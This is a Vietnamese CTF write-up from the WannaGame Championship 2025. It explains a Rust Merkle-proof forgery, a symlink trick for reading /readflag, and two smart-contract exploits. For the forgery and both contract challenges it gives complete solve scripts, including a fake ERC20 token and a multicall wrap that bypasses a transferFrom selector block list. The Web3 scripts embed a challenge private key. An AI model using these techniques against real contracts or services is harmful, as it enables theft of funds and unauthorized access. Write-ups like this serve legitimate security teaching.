---
title: "WannaGame Championship 2025"
description: "Lần đầu với team laviaespa và đứng vị trí thứ 4 chung cuộc"
date: 2025-12-08T13:44:12+07:00
cover: /images/WannaChamp/avatar.png
math: true
license: 
hidden: false
comments: true
tags: 
    - CTF
    - Cryptography
    - Reverse
    - Web3
categories:
    - CTF Write-up
    - WannaGame
---

# Crypto
## King Halo
**Mô tả**: Uma Musume is the best mobile game in 2025

https://www.youtube.com/watch?v=eAkxxgEHEmg

**Đính kèm**: `attachments.tar`

Thử thách này sử dụng Rust làm ngôn ngữ chính để chạy chương trình.
Yêu cầu của nó là mình phải chiến thắng 50 rounds đua ngựa để lấy được flag. Đầu tiền, đăng ký tên và chiến thuật cho 1 con ngựa:
```rust
write!(writer, "Register your horse name: ")?;
writer.flush()?;
let horse_name = read_line_trimmed(reader)?;
if horse_name.is_empty() {
    writeln!(writer, "Name cannot be empty. Session terminated.")?;
    return Ok(());
}

writeln!(writer, "Choose your running strategy:")?;
writeln!(writer, "  1) Front-runner")?;
writeln!(writer, "  2) Pace-maker")?;
writeln!(writer, "  3) Late charge")?;
writeln!(writer, "  4) End spurt")?;
write!(writer, "Strategy selection: ")?;
writer.flush()?;
let strategy_line = read_line_trimmed(reader)?;
let user_strategy = match parse_strategy_choice(&strategy_line) {
    Some(strategy) => strategy,
    None => {
        writeln!(writer, "Invalid strategy choice. Session terminated.")?;
        return Ok(());
    }
};
```
Sau đó, đề cho mình biết các dữ kiện như là: `race distance`, `merkle root`, các vị trí và chỉ số của 16 con ngựa (tính cả ngựa của mình):
```rust
writeln!(writer, "Race distance: {}m", race_distance)?;
writeln!(writer, "Merkle root: {}", fp_to_hex(&root))?;
writeln!(writer, "Your horse occupies slot {}.", user_slot)?;
writeln!(
    writer,
    "Index | Name                 | Strategy        | Stats [spd sta pow gut wit]"
)?;
for (idx, entry) in entries.iter().enumerate() {
    let marker = if idx == user_slot { "*" } else { " " };
    writeln!(
        writer,
        "{}{:>2} | {:<20} | {:<15} | [{:>6.1} {:>6.1} {:>6.1} {:>6.1} {:>6.1}]",
        marker,
        idx,
        profiles[idx].name,
        entry.strategy.get_name(),
        entry.speed,
        entry.stamina,
        entry.power,
        entry.guts,
        entry.wit
    )?;
}
```

Cuối cùng đề trả về `proof` cho con ngựa của mình gồm `index`, `leaf`, `path_elements` và `path_indices`. Mình sẽ phải gửi lại proof của con ngựa chiến thắng vì không có hàm check con ngựa đó có phải của mình không.

Đọc hết hàm `server.rs`, mình thấy có một chi tiết ở cuối:
```rust
#[derive(Deserialize)]
struct UserProofPayload {
    index: usize,
    leaf: String,
    #[serde(default)]
    path_elements: Vec<String>,
    #[serde(default)]
    path_indices: Vec<u8>,
}
```

Nếu gửi JSON thiếu 2 trường `path_elements` và `path_indices`, chúng sẽ là Vector rỗng []. Nếu nó rỗng thì server sẽ không kiểm tra `leaf` có khớp không vì vòng lặp sau:
```rust
let provided_proof_result: io::Result<Vec<(bool, Fp)>> = provided_indices
    .into_iter()
    .zip(provided_elements.into_iter())
    .map(|(is_left, sibling)| {
        if leaves[provided_payload.index] != provided_leaf {
            writeln!(
                writer,
                "Provided leaf does not match the claimed horse slot. Game over."
            )?;
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "provided leaf does not match slot",
            ));
        }
        Ok((is_left, sibling))
    })
    .collect();
```
Ở hàm `verify_proof`, nếu `proof` rỗng thì nó sẽ đưa `leaf` vào thẳng `circuit` rồi so sánh với `root`:
```rust
pub fn verify_proof(root: Fp, leaf: Fp, proof: &[(bool, Fp)], expected_depth: usize) -> bool {
    if proof.len() != expected_depth {
        eprintln!(
            "[verify_proof] Depth mismatch: expected {}, got {}",
            expected_depth,
            proof.len()
        );
        return false;
    }

    let path_elements: Vec<Value<Fp>> = proof.iter().map(|(_, sibling)| Value::known(*sibling)).collect();
    let path_indices: Vec<Value<Fp>> = proof
        .iter()
        .map(|(is_left, _)| {
            let bit = if *is_left { Fp::from(1) } else { Fp::from(0) };
            Value::known(bit)
        })
        .collect();

    let circuit = MerkleCircuit::<OrchardNullifier, 3, 2> {
        leaf: Value::known(leaf),
        path_elements,
        path_indices,
        _spec: PhantomData,
    };

    match MockProver::run(12, &circuit, vec![vec![root]]) {
        Ok(prover) => {
            let is_valid = prover.verify().is_ok();
            is_valid
        }
        Err(err) => {
            false
        }
    }
}
```
Vì vậy ta có thể forge proof thành: (`index`, `leaf`, `path_elements`, `path_indices`) = (`index`, `merkle_root`, [], []). Vấn đề là con ngựa vị trí số mấy sẽ chiến thắng?

Giải pháp của tôi cho vấn đề này là ta sẽ mô phỏng 50000 trận giả lập bằng thư viện `rayon` cùng lúc trên tất cả các nhân CPU và tìm ra con ngựa có số lần về nhất nhiều nhất.
Sau đây là script của tôi:
```rust
#![allow(dead_code)]
#![allow(unused_imports)]
#![allow(unused_variables)]

mod config;
mod merkle;
mod merkle_circuit;
mod racing;
mod server;
mod uma;

use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::sync::{Arc, Mutex};
use rand::{Rng, SeedableRng, rngs::StdRng};
use regex::Regex;
use serde::{Serialize};
use rayon::prelude::*;
use crate::racing::{simulate_race, RaceEntry, Strategy};

#[derive(Serialize)]
struct ForgedProofPayload {
    index: usize,
    leaf: String,
    path_elements: Vec<String>,
    path_indices: Vec<u8>,
}

#[derive(Clone, Debug)]
struct ParsedHorse {
    index: usize,
    name: String,
    strategy: Strategy,
    stats: [u64; 5],
}

fn predict_winner_parallel(horses: &[ParsedHorse], race_distance: u32) -> usize {
    let mut entries_map: Vec<Option<RaceEntry>> = vec![None; 16];
    for h in horses {
        if h.index < 16 {
            entries_map[h.index] = Some(RaceEntry {
                name: h.name.clone(),
                speed: h.stats[0] as f64,
                stamina: h.stats[1] as f64,
                power: h.stats[2] as f64,
                guts: h.stats[3] as f64,
                wit: h.stats[4] as f64,
                strategy: h.strategy,
            });
        }
    }

    let valid_entries: Vec<RaceEntry> = entries_map.iter().filter_map(|e| e.clone()).collect();
    
    if valid_entries.len() < 16 {
        println!("[!] WARNING: Only {}/16 horses parsed. Prediction may be inaccurate.", valid_entries.len());
        if valid_entries.is_empty() { return 0; }
    }

    let simulations = 50_000; 
    
    let win_counts = (0..simulations).into_par_iter()
        .map(|_| {
            let mut rng = rand::thread_rng();
            let seed: u64 = rng.gen();
            let results = simulate_race(&valid_entries, race_distance as f64, seed);
            results.first().map(|r| r.index).unwrap_or(0)
        })
        .fold(
            || vec![0u32; 16], 
            |mut acc: Vec<u32>, winner_idx: usize| {
                if winner_idx < acc.len() {
                    acc[winner_idx] += 1;
                }
                acc
            }
        )
        .reduce(
            || vec![0u32; 16],
            |mut a, b| {
                for i in 0..16 {
                    a[i] += b[i];
                }
                a
            }
        );

    let mut best_idx = 0;
    let mut max_wins = 0;

    println!("\n--- High-Precision Analysis ({} Sims) ---", simulations);
    for (i, &wins) in win_counts.iter().enumerate() {
        if let Some(entry) = &entries_map[i] {
            let win_rate = (wins as f64 / simulations as f64) * 100.0;
            
            if wins > max_wins {
                max_wins = wins;
                best_idx = i;
            }

            if win_rate > 1.0 {
                println!("Idx {:<2} | Win Rate: {:>5.2}% ({:>5} wins) | Strat: {:?}", 
                    i, win_rate, wins, entry.strategy);
            }
        }
    }

    println!(">>> BEST CHOICE: Index {} (Confidence: {:.2}%)", 
        best_idx, (max_wins as f64 / simulations as f64) * 100.0);
    
    best_idx
}

fn main() -> std::io::Result<()> {
    let target_host = "challenge.cnsc.com.vn";-
    let target_port = 30384;

    println!("[*] V8 Solver: Parallel Monte Carlo (50k Sims)");
    println!("[*] Connecting to {}:{}", target_host, target_port);
    let stream = TcpStream::connect(format!("{}:{}", target_host, target_port))?;
    let mut reader = BufReader::new(stream.try_clone()?);
    let mut writer = stream;

    let re_table = Regex::new(r"^\s*[\*\s]?\s*(\d+)\s+\|\s+(.*?)\s+\|\s+(.*?)\s+\|\s+\[\s*([\d\.]+)\s+([\d\.]+)\s+([\d\.]+)\s+([\d\.]+)\s+([\d\.]+)\s*\]").unwrap();
    let re_dist = Regex::new(r"Race distance: (\d+)m").unwrap();
    let re_root = Regex::new(r"Merkle root: ([0-9a-fA-F]+)").unwrap();

    let mut horses: Vec<ParsedHorse> = Vec::new();
    let mut race_distance = 0u32;
    let mut current_merkle_root = String::new();

    loop {
        let mut line = String::new();
        match reader.read_line(&mut line) {
            Ok(0) => break,
            Ok(_) => {
                let trimmed = line.trim();
                if trimmed.is_empty() { continue; }
                println!("{}", trimmed);

                if trimmed.starts_with("Round") {
                    horses.clear();
                    current_merkle_root.clear();
                    println!("[>] Sending Horse Name...");
                    writeln!(writer, "HackerHorse")?;
                    writer.flush()?;
                }
                
                if trimmed.contains("4) End spurt") {
                    println!("[>] Sending Strategy (1)...");
                    writeln!(writer, "1")?;
                    writer.flush()?;
                }

                if let Some(caps) = re_dist.captures(trimmed) {
                    race_distance = caps[1].parse().unwrap();
                }
                if let Some(caps) = re_root.captures(trimmed) {
                    current_merkle_root = caps[1].to_string();
                }

                if let Some(caps) = re_table.captures(trimmed) {
                    let idx: usize = caps[1].parse().unwrap();
                    let name = caps[2].trim().to_string();
                    let strat_str = caps[3].trim();
                    
                    let strategy = if strat_str.starts_with("Front") { Strategy::Front }
                    else if strat_str.starts_with("Pace") { Strategy::Pace }
                    else if strat_str.starts_with("Late") { Strategy::Late }
                    else { Strategy::End };

                    let stats: [u64; 5] = [
                        caps[4].parse::<f64>().unwrap().round() as u64,
                        caps[5].parse::<f64>().unwrap().round() as u64,
                        caps[6].parse::<f64>().unwrap().round() as u64,
                        caps[7].parse::<f64>().unwrap().round() as u64,
                        caps[8].parse::<f64>().unwrap().round() as u64,
                    ];
                    horses.push(ParsedHorse { index: idx, name, strategy, stats });
                }

                if trimmed.contains("Submit your proof JSON:") {
                    let predicted_winner = predict_winner_parallel(&horses, race_distance);
                    let forged = ForgedProofPayload {
                        index: predicted_winner,
                        leaf: current_merkle_root.clone(),
                        path_elements: vec![],
                        path_indices: vec![],
                    };

                    let json = serde_json::to_string(&forged).unwrap();
                    println!("[>] Exploit Index {}...", predicted_winner);
                    writeln!(writer, "{}", json)?;
                    writer.flush()?;
                }
                
                if trimmed.contains("W1{") {
                    println!("\n\n[!!!] FLAG FOUND: {}\n", trimmed);
                    std::process::exit(0);
                }
            }
            Err(_) => break,
        }
    }
    Ok(())
}
```

**Flag:** `W1{1-F0rG07_T0_ch3Ck-PATh-l3ng7h-0F-th3_m3rKl3-TR33450dba}`

# Reverse
## Buzzing
Mình tải private key `id_ed25519` về và kết nối tới server:
- Cấp quyền: `chmod 600 id_ed25519`
- Connect: `ssh -i id_ed25519 bocchi@spawner.zaki.moe -p 10229`
- Di chuyển tới thư mục gốc: `cd /`
- Tạo 1 symbolic link với `/readflag` để có quyền đọc: `ln -s /readflag /tmp/flag_reader`
- Mở link mới tạo: `/tmp/flag_reader`
**Flag:** `W1{just_4_s1mpl3_3bpf_l04d3r_buzz1n'_4r0und_fufu_76274bc788378a36b3345a49948045e9}`

# Web3
## Freex
Bài này mô phỏng một sàn giao dịch cho phép nạp, rút, stake và hoán đổi token.
Hàm `isSolved()` trong `Setup.sol` yêu cầu người chơi phải sở hữu > 10 oneEth.

Mình giải được bài này qua việc khai thác lỗ hổng quản lý nợ của contract `Exchange.sol` kết hợp với việc sàn không kiểm tra loại token được phép giao dịch.

Vì contract Exchange không có Whitelist mà nó chấp nhận mọi token tuân thủ chuẩn ERC20 nên mình sẽ tự in ra `FakeToken` và dùng token này để làm `receivedWannaETH` lên con số mình muốn.
```python
FAKE_TOKEN_SRC = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FakeToken {
    string public name = "Fake";
    string public symbol = "FAKE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * 10**18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value, "Balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(balanceOf[from] >= value, "Balance");
        if (allowance[from][msg.sender] != type(uint256).max) {
            require(allowance[from][msg.sender] >= value, "Allowance");
            allowance[from][msg.sender] -= value;
        }
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
}
"""
```

Sau đó, mình tận dụng lỗ hổng giữa `exchangeToken` và `deposit` vì khi số dư nhỏ hơn 0 thì contract `exchangeToken` ghi nhận mình đang nợ và thêm token vào `liabilities`. Tuy nhiên khi nạp tiền vào để trả nợ thì contract lại không xóa token khỏi `liabilities`, điều đó làm hệ thống nghĩ mình vẫn còn một khoản nợ. Lúc này, mình gọi hàm `claimReceivedWannaETH`, lấy `receivedWannaETH` từ `exchangeToken` và nhận đủ điểm để đổi ra tiền thật thỏa mãn yêu cầu đề bài.

Sau đây là script:
```python
from web3 import Web3
from pwn import *
import time
from solcx import install_solc, compile_source

HOST = 'challenge.cnsc.com.vn'
PORT_NC = 31284
PORT_RPC = 30904
UUID = "342df168-88f2-4813-ab3e-b7b2edfec29d"
PRIVATE_KEY = "605b3efe7abd3e4ddab9268a3fe8edfea38a8a24cce3b5dc5d95e65079d227b4"
SETUP_ADDRESS = "0x26644A4BF4c72515AF907c85AB71C8eC7c94b647"

RPC_URL = f"http://{HOST}:{PORT_RPC}/{UUID}"

FAKE_TOKEN_SRC = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FakeToken {
    string public name = "Fake";
    string public symbol = "FAKE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * 10**18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value, "Balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(balanceOf[from] >= value, "Balance");
        if (allowance[from][msg.sender] != type(uint256).max) {
            require(allowance[from][msg.sender] >= value, "Allowance");
            allowance[from][msg.sender] -= value;
        }
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
}
"""

SETUP_ABI = [
    {"inputs":[],"name":"exchange","outputs":[{"internalType":"contract Exchange","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"register","outputs":[],"stateMutability":"nonpayable","type":"function"} 
]

EXCHANGE_ABI = [
    {"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"asset","type":"address"},{"internalType":"uint64","name":"amount","type":"uint64"}],"name":"exchangeToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"asset","type":"address"},{"internalType":"uint64","name":"amount","type":"uint64"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"claimReceivedWannaETH","outputs":[],"stateMutability":"nonpayable","type":"function"}
]

def get_flag():
    print(f"\n[*] Connecting to {HOST}:{PORT_NC} to retrieve FLAG...")
    try:
        r = remote(HOST, PORT_NC)
        r.recvuntil(b'action? ')
        r.sendline(b'3')
        print(f"\n{'='*30}")
        print(f"flag:\n{r.recvall(timeout=10).decode().strip()}")
        print(f"{'='*30}\n")
        r.close()
    except Exception as e:
        print(f"[-] Error getting flag: {e}")

def solve():
    print(f"[*] Compiling FakeToken...")
    try:
        install_solc('0.8.20')
    except:
        pass
    
    compiled_sol = compile_source(FAKE_TOKEN_SRC, solc_version='0.8.20')
    contract_id, contract_interface = list(compiled_sol.items())[0]
    bytecode = contract_interface['bin']
    abi = contract_interface['abi']

    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[-] RPC Connection failed.")
        return

    account = w3.eth.account.from_key(PRIVATE_KEY)
    player = account.address
    print(f"[+] Player: {player}")

    def send_tx(tx_data, to=None):
        tx = {
            'from': player,
            'nonce': w3.eth.get_transaction_count(player),
            'gas': 2000000,
            'gasPrice': w3.eth.gas_price,
            'data': tx_data,
            'chainId': w3.eth.chain_id
        }
        if to: tx['to'] = to
        signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        return w3.eth.wait_for_transaction_receipt(tx_hash)

    setup = w3.eth.contract(address=SETUP_ADDRESS, abi=SETUP_ABI)
    exchange_addr = setup.functions.exchange().call()
    exchange = w3.eth.contract(address=exchange_addr, abi=EXCHANGE_ABI)
    fake_token = w3.eth.contract(abi=abi, bytecode=bytecode)

    reg_tx = setup.functions.register().build_transaction({
        'from': player, 'nonce': w3.eth.get_transaction_count(player), 'gasPrice': w3.eth.gas_price
    })
    send_tx(reg_tx['data'], to=SETUP_ADDRESS)
    print("Registered success!")

    construct_txn = fake_token.constructor().build_transaction({
        'from': player, 'nonce': w3.eth.get_transaction_count(player), 'gasPrice': w3.eth.gas_price
    })

    signed = w3.eth.account.sign_transaction(construct_txn, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    fake_token_addr = receipt.contractAddress
    print(f"FakeToken deployed at: {fake_token_addr}")

    fake_token_deployed = w3.eth.contract(address=fake_token_addr, abi=abi)

    approve_tx = fake_token_deployed.functions.approve(exchange_addr, 2**256-1).build_transaction({
        'from': player, 'nonce': w3.eth.get_transaction_count(player), 'gasPrice': w3.eth.gas_price
    })
    send_tx(approve_tx['data'], to=fake_token_addr)

    amount = w3.to_wei(15, 'ether')
    
    exch_tx = exchange.functions.exchangeToken(player, fake_token_addr, int(amount)).build_transaction({
        'from': player, 'nonce': w3.eth.get_transaction_count(player), 'gasPrice': w3.eth.gas_price
    })
    send_tx(exch_tx['data'], to=exchange_addr)

    dep_tx = exchange.functions.deposit(fake_token_addr, int(amount)).build_transaction({
        'from': player, 'nonce': w3.eth.get_transaction_count(player), 'gasPrice': w3.eth.gas_price
    })
    send_tx(dep_tx['data'], to=exchange_addr)

    claim_tx = exchange.functions.claimReceivedWannaETH().build_transaction({
        'from': player, 'nonce': w3.eth.get_transaction_count(player), 'gasPrice': w3.eth.gas_price
    })
    send_tx(claim_tx['data'], to=exchange_addr)

    if setup.functions.isSolved().call():
        get_flag()

if __name__ == "__main__":
    solve()
```

**Flag:** `W1{here_FoR_YOu-The_freE3x_cH4LLeNgE-flAG66eb}`

## WickedCraft
Hàm `isSolved()` trả về true khi số dư của contract WannaCoin phải lớn hơn 10.000 WC. Ban đầu, contract `Setup` nắm giữ 1.000.000 WC và ta phải chuyển số tiền này từ `Setup` về lại địa chỉ `WannaCoin`.

Trong file `Aggregator.sol`, hàm `executeCommandCall` có một đoạn kiểm tra chặn selector `0x23b872dd` (tương ứng với hàm transferFrom). Điều này nhằm ngăn chặn việc dùng `Aggregator` để rút tiền từ các ví đã approve cho nó.
```sol
 function executeCommandCall(
    uint256 i,
    uint256 outputPtr,
    uint256 outputOffsetPtr
) private returns (uint256) {
    bytes memory input;
    uint256 nativeAmount;
    (input, nativeAmount) = getInput(i, outputPtr);
    uint256 outputLength;
    assembly {
        outputLength := shr(240, calldataload(add(i, 1)))

        switch shr(224, mload(add(input, 32))) // selector
        case 0 {
            // InvalidSelector
            mstore(
                0,
                0x7352d91c00000000000000000000000000000000000000000000000000000000
            )
            revert(0, 4)
        }
        case 0x23b872dd {
            // Blacklist transferFrom in custom calls
            // InvalidTransferFromCall
            mstore(
                0,
                0x1751a8e400000000000000000000000000000000000000000000000000000000
            )
            revert(0, 4)
        }
        default {
            ...
```
Thay vì gọi trực tiếp `transferFrom`, mình đóng gói (wrap) lệnh `transferFrom` vào bên trong hàm `multicall(bytes[])` vì `WannaCoin` kế thừa từ `Multicall`.
```sol
abstract contract Multicall {
    /**
     * @dev Receives and executes a batch of function calls on this contract.
     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall
     */
    function multicall(
        bytes[] calldata data
    ) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
}
```
Và từ đây, `aggregator` chỉ kiểm tra selector của hàm lớp ngoài cùng (ở đây là `multicall` - `0xac9650d8`). Do đó, nó cho phép lệnh đi qua và ta thực hiện chuyển tiền thành công.
```python
sel_transfer = get_selector("transferFrom(address,address,uint256)")
params_transfer = encode(
    ['address', 'address', 'uint256'],
    [SETUP_ADDRESS, coin_address, setup_balance]
)
inner_call = sel_transfer + params_transfer

sel_multicall = get_selector("multicall(bytes[])")
params_multicall = encode(['bytes[]'], [[inner_call]])
final_payload_bytes = sel_multicall + params_multicall
```

Hơn nữa, tôi còn thấy lỗi logic trong vòng lặp Command ở `Aggregator.sol`. Hàm `execute` xác định điểm kết thúc vòng lặp `commandsOffsetEnd` dựa trên độ dài của toàn bộ dữ liệu đầu vào `swapArgsLength`.
```sol
function getCommandData()
    private
    pure
    returns (
        uint16 commandsOffset,
        uint16 commandsOffsetEnd,
        uint16 outputsLength
    )
{
    assembly {
        commandsOffset := add(70, shr(240, calldataload(68))) // dataOffset + dataLength
        commandsOffsetEnd := add(68, calldataload(36)) // commandsOffsetEnd / swapArgsOffset + swapArgsLength (swapArgsOffset - 32)
        outputsLength := shr(240, calldataload(70)) // dataOffset + 32
    }
}
```

Do đó, tôi đặt một `blob` lớn (800 bytes) và Command thực thi (Action Call) nằm ở 9 bytes cuối cùng của blob `COMMAND_ABS` rồi sau đó chỉnh sửa header `commandsOffset` để trỏ thẳng xuống cuối blob này. Lúc này, vòng lặp chạy đúng 1 lần duy nhất cho Command và sau đó i += 9 sẽ vượt quá độ dài file, vòng lặp kết thúc an toàn mà không chạy vào vùng dữ liệu rác gây lỗi.
```python
blob_size = 800
blob = bytearray(blob_size)
ABS_START = 68 

def set_val(offset_abs, value_bytes):
    blob[offset_abs - ABS_START : offset_abs - ABS_START + len(value_bytes)] = value_bytes

def set_ptr(ptr_index_abs, target_abs):
    blob[ptr_index_abs - ABS_START] = 0x00 
    blob[ptr_index_abs - ABS_START + 1] = (target_abs >> 8) & 0xFF
    blob[ptr_index_abs - ABS_START + 2] = (target_abs) & 0xFF

COIN_ADDR_ABS = 200
SEQ_HEADER_ABS = 300
PAYLOAD_DATA_ABS = 350
DEADLINE_VAL_ABS = 600
ZERO_ZONE_ABS = 700

COMMAND_ABS = 68 + blob_size - 9 

coin_bytes = bytes.fromhex(coin_address[2:])


cmd_offset_val = COMMAND_ABS - 70
blob[0] = (cmd_offset_val >> 8) & 0xFF
blob[1] = (cmd_offset_val) & 0xFF


blob[4:24] = coin_bytes
blob[24:44] = coin_bytes
blob[44:64] = coin_bytes


set_ptr(132, DEADLINE_VAL_ABS)
set_ptr(135, ZERO_ZONE_ABS)
set_ptr(138, ZERO_ZONE_ABS)
set_ptr(141, ZERO_ZONE_ABS)


set_val(COIN_ADDR_ABS, coin_bytes)
set_val(PAYLOAD_DATA_ABS, final_payload_bytes)
set_val(DEADLINE_VAL_ABS, (int(time.time()) + 9999999).to_bytes(32, 'big'))


seq_hdr_idx = SEQ_HEADER_ABS - ABS_START
p_len = len(final_payload_bytes)
blob[seq_hdr_idx] = 0x04
blob[seq_hdr_idx+1] = (PAYLOAD_DATA_ABS >> 8) & 0xFF
blob[seq_hdr_idx+2] = (PAYLOAD_DATA_ABS) & 0xFF
blob[seq_hdr_idx+3] = (p_len >> 8) & 0xFF
blob[seq_hdr_idx+4] = (p_len) & 0xFF

SEQUENCE_END_ABS = SEQ_HEADER_ABS + 5


cmd_idx = COMMAND_ABS - ABS_START
blob[cmd_idx] = 0x00
blob[cmd_idx+1] = 0x00
blob[cmd_idx+2] = 0x00
blob[cmd_idx+3] = (SEQ_HEADER_ABS >> 8) & 0xFF 
blob[cmd_idx+4] = (SEQ_HEADER_ABS) & 0xFF
blob[cmd_idx+5] = (SEQUENCE_END_ABS >> 8) & 0xFF 
blob[cmd_idx+6] = (SEQUENCE_END_ABS) & 0xFF
blob[cmd_idx+7] = (COIN_ADDR_ABS >> 8) & 0xFF 
blob[cmd_idx+8] = (COIN_ADDR_ABS) & 0xFF
```
Ngoài ra, hàm swap gọi `Calldata.getSwapData()`. Hàm này đọc trực tiếp từ `calldata` để lấy `toAddress`, `deadline`, v.v. Nếu dữ liệu này không hợp lệ (ví dụ `deadline` quá khứ, hoặc address bằng 0), transaction sẽ bị revert.
```sol
function getSwapData() internal view returns (SwapData memory swapData) {
    assembly {
        let deadline := shr(
            shr(248, calldataload(132)), // dataOffset + 62
            calldataload(shr(240, calldataload(133))) // dataOffset + 62 + 1
        )

        if lt(deadline, timestamp()) {
            // ExpiredTransaction
            mstore(
                0,
                0x931997cf00000000000000000000000000000000000000000000000000000000
            )
            revert(0, 4)
        }

        mstore(swapData, shr(96, calldataload(72))) // toAddress / dataOffset + 2
        mstore(add(swapData, 32), shr(96, calldataload(92))) // fromAssetAddress / dataOffset + 22
        mstore(add(swapData, 64), shr(96, calldataload(112))) // toAssetAddress / dataOffset + 42
        mstore(add(swapData, 96), deadline)
        mstore(
            add(swapData, 128),
            shr(
                shr(248, calldataload(135)), // dataOffset + 62 + 3
                calldataload(shr(240, calldataload(136))) // dataOffset + 62 + 4
            )
        ) // amountOutMin
        mstore(
            add(swapData, 160),
            shr(
                shr(248, calldataload(138)), // dataOffset + 62 + 6
                calldataload(shr(240, calldataload(139))) // dataOffset + 62 + 7
            )
        ) // swapFee
        mstore(
            add(swapData, 192),
            shr(
                shr(248, calldataload(141)), // dataOffset + 62 + 9
                calldataload(shr(240, calldataload(142))) // dataOffset + 62 + 10
            )
        ) // amountIn
        // calldataload(144) // r
        // calldataload(176) // s
        // shr(248, calldataload(208)) // v
        let hasPermit := gt(shr(248, calldataload(209)), 0) // permit v
        mstore(add(swapData, 224), hasPermit) // hasPermit
        // calldataload(210) // permit r
        // calldataload(242) // permit s
        // calldataload(274) // permit deadline
        switch hasPermit
        case 1 {
            let hasAffiliate := shr(248, calldataload(277))
            mstore(add(swapData, 256), hasAffiliate) // hasAffiliate
            if eq(hasAffiliate, 1) {
                mstore(add(swapData, 288), shr(96, calldataload(278))) // affiliateAddress
                mstore(
                    add(swapData, 320),
                    shr(
                        shr(248, calldataload(298)),
                        calldataload(shr(240, calldataload(299)))
                    )
                ) // affiliateFee
            }
        }
        default {
            let hasAffiliate := shr(248, calldataload(210))
            mstore(add(swapData, 256), hasAffiliate) // hasAffiliate
            if eq(hasAffiliate, 1) {
                mstore(add(swapData, 288), shr(96, calldataload(211))) // affiliateAddress
                mstore(
                    add(swapData, 320),
                    shr(
                        shr(248, calldataload(231)),
                        calldataload(shr(240, calldataload(232)))
                    )
                ) // affiliateFee
            }
        }
    }
}
```
Ở đây, ta sẽ ghi đè thủ công địa chỉ `WannaCoin` vào các vị trí offset 72, 92, 112 (tương ứng với các trường địa chỉ trong struct `SwapData`), ghi `deadline` thành một timestamp trong tương lai tại vị trí offset 132 trỏ tới 600 (nơi chứa giá trị thời gian). Điều này giúp vượt qua tất cả các validation checks của `Aggregator` để nó đồng ý thực thi lệnh `execute`.
```python
sel_swap = get_selector("swap(bytes)")
params_swap = encode(['bytes'], [bytes(blob)])
tx_data = sel_swap + params_swap

tx_params = {
    'from': account.address,
    'to': aggregator_address,
    'data': tx_data,
    'gas': 3000000,
    'gasPrice': w3.eth.gas_price,
    'value': 0
}

w3.eth.call(tx_params)
tx_params['nonce'] = w3.eth.get_transaction_count(account.address)
signed_tx = w3.eth.account.sign_transaction(tx_params, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
print(f"[+] Tx Hash: {tx_hash.hex()}")
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
solved = setup_contract.functions.isSolved().call()
if solved:
    print("\nCHALLENGE SOLVED!")
```
**Flag:** `W1{tHlS_l5-wlCKeDCRAft-Ch@IIenGE_F1ag82de}`